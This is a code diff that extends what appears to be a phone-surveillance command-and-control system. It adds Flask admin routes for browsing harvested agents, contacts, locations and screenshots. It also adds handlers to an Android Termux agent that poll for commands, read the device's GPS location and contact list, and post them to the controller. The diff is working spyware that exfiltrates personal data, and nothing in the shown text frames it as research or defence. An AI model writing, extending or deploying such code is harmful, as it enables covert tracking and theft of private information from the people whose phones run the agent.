@@ -315,6 +315,136 @@ def admin_dashboard():
         logger.error(f"Admin dashboard error: {e}")
         return "Error loading admin dashboard", 500
 
+# ==================== DEBUG ROUTES (MISSING ROUTES FIX) ====================
+
+@app.route('/debug/agents')
+def debug_agents():
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    try:
+        with db_lock:
+            conn = get_db_connection()
+            agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
+            conn.close()
+        
+        return render_template('debug_agents.html', agents=agents)
+    except Exception as e:
+        logger.error(f"Debug agents error: {e}")
+        return "Error loading agents", 500
+
+@app.route('/debug/screenshots')
+def debug_screenshots():
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    try:
+        with db_lock:
+            conn = get_db_connection()
+            screenshots = safe_fetchall(conn.execute('''
+                SELECT s.*, a.phone_model FROM screenshots s 
+                LEFT JOIN agents a ON s.agent_id = a.agent_id 
+                ORDER BY s.timestamp DESC
+            '''))
+            conn.close()
+        
+        return render_template('debug_screenshots.html', screenshots=screenshots)
+    except Exception as e:
+        logger.error(f"Debug screenshots error: {e}")
+        return "Error loading screenshots", 500
+
+@app.route('/debug/clear_data')
+def clear_data():
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    try:
+        with db_lock:
+            conn = get_db_connection()
+            conn.execute("DELETE FROM agents")
+            conn.execute("DELETE FROM screenshots")
+            conn.execute("DELETE FROM contacts")
+            conn.execute("DELETE FROM locations")
+            conn.execute("DELETE FROM commands")
+            conn.execute("DELETE FROM system_logs")
+            conn.commit()
+            conn.close()
+        
+        log_event('INFO', 'All data cleared by admin')
+        return redirect('/admin')
+    except Exception as e:
+        logger.error(f"Clear data error: {e}")
+        return "Error clearing data", 500
+
+@app.route('/admin/contacts/<agent_id>')
+def view_contacts(agent_id):
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    try:
+        with db_lock:
+            conn = get_db_connection()
+            contacts = safe_fetchall(conn.execute(
+                "SELECT * FROM contacts WHERE agent_id=? ORDER BY timestamp DESC", 
+                (agent_id,)
+            ))
+            agent = safe_fetchone(conn.execute(
+                "SELECT agent_id FROM agents WHERE agent_id=?", (agent_id,)
+            ))
+            conn.close()
+        
+        if not agent:
+            return "Agent not found", 404
+        
+        return render_template('contacts.html', contacts=contacts, agent_id=agent_id)
+    except Exception as e:
+        logger.error(f"View contacts error: {e}")
+        return "Error loading contacts", 500
+
+@app.route('/admin/locations/<agent_id>')
+def view_locations(agent_id):
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    try:
+        with db_lock:
+            conn = get_db_connection()
+            locations = safe_fetchall(conn.execute(
+                "SELECT * FROM locations WHERE agent_id=? ORDER BY timestamp DESC", 
+                (agent_id,)
+            ))
+            agent = safe_fetchone(conn.execute(
+                "SELECT agent_id FROM agents WHERE agent_id=?", (agent_id,)
+            ))
+            conn.close()
+        
+        if not agent:
+            return "Agent not found", 404
+        
+        return render_template('locations.html', locations=locations, agent_id=agent_id)
+    except Exception as e:
+        logger.error(f"View locations error: {e}")
+        return "Error loading locations", 500
+
+@app.route('/admin/remove_agent/<agent_id>')
+def remove_agent(agent_id):
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    try:
+        with db_lock:
+            conn = get_db_connection()
+            conn.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
+            conn.execute("DELETE FROM commands WHERE agent_id=?", (agent_id,))
+            conn.commit()
+            conn.close()
+        
+        log_event('INFO', f'Agent removed: {agent_id}')
+        return redirect('/admin')
+    except Exception as e:
+        logger.error(f"Remove agent error: {e}")
+        return "Error removing agent", 500
+
 # ==================== AGENT DOWNLOAD ROUTE ====================
 
 @app.route('/download_agent')
@@ -402,6 +532,15 @@ class RealAgent:
                     commands = response.json().get('commands', [])
                     for cmd in commands:
                         print(f"📨 Command: {{cmd['command']}}")
+                        # Execute the command
+                        if cmd['command'] == 'get_location':
+                            self.get_location()
+                        elif cmd['command'] == 'get_contacts':
+                            self.get_contacts()
+                        elif cmd['command'] == 'capture_screenshot':
+                            self.capture_screenshot()
+                        elif cmd['command'] == 'get_device_info':
+                            self.send_device_info()
                 
                 # Send heartbeat
                 requests.post(f"{{self.server_url}}/api/agent/submit_report", json={{
@@ -414,6 +553,54 @@ class RealAgent:
                 print(f"⚠️ Error: {{e}}")
             
             time.sleep(60)
+    
+    def get_location(self):
+        try:
+            result = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=15)
+            if result.returncode == 0:
+                location_data = json.loads(result.stdout)
+                requests.post(f"{{self.server_url}}/api/agent/submit_report", json={{
+                    'agent_id': self.agent_id,
+                    'report_type': 'location',
+                    'report_data': location_data
+                }}, timeout=10)
+        except:
+            pass
+    
+    def get_contacts(self):
+        try:
+            result = subprocess.run(['termux-contact-list'], capture_output=True, text=True, timeout=15)
+            if result.returncode == 0:
+                contacts_data = json.loads(result.stdout)
+                requests.post(f"{{self.server_url}}/api/agent/submit_report", json={{
+                    'agent_id': self.agent_id,
+                    'report_type': 'contacts',
+                    'report_data': {{'contacts': contacts_data[:20]}}  # Limit to 20 contacts
+                }}, timeout=10)
+        except:
+            pass
+    
+    def capture_screenshot(self):
+        try:
+            result = subprocess.run(['termux-screenshot'], capture_output=True, text=True, timeout=10)
+            if result.returncode == 0:
+                # Screenshot saved, we'd need to read and encode it
+                # For now, just acknowledge
+                print("📸 Screenshot captured")
+        except:
+            pass
+    
+    def send_device_info(self):
+        model, android = self.get_device_info()
+        requests.post(f"{{self.server_url}}/api/agent/submit_report", json={{
+            'agent_id': self.agent_id,
+            'report_type': 'device_info',
+            'report_data': {{
+                'phone_model': model,
+                'android_version': android,
+                'battery': 85  # Placeholder
+            }}
+        }}, timeout=10)
 
 if __name__ == '__main__':
     if len(sys.argv) != 3:
